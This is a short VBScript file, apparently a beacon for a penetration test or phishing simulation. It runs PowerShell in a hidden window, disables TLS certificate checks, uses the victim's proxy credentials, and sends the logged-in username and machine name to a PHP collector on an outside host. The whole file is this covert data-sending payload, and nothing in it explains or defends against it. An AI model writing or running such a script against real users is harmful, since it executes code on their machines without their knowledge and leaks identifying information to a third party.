Enter file contents hereDim objShell 

Set objShell = WScript.CreateObject ("WScript.shell") 

objShell.run "powershell -windowstyle Hidden ""[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc = new-object system.net.WebClient; $proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials; $wc.proxy = $proxy;$user = [Environment]::UserName; $machine = [Environment]::MachineName; $wc.DownloadData('http://pt.info-assurance.com/ttb-vbs-collector.php?user=' + $user + '&machine=' + $machine);""" 

Set objShell = Nothing 
